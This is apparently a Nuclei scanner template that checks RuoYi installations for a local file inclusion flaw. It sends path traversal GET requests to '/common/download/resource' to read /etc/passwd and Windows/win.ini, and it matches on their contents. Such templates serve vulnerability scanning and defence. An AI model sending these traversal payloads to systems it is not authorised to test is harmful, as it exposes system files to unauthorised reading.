id: RuoYi-fileInclude
info:
  author: str1am
  name: "\u82E5\u4F9D\u672C\u5730\u6587\u4EF6\u5305\u542B"
  severity: high
  tags: ruoyi,lfi
requests:
- matchers:
  - part: body
    regex:
    - root:.*:0:0
    type: regex
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - extensions
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd'
  - '{{BaseURL}}/common/download/resource?resource=/profile/../../../../Windows/win.ini'
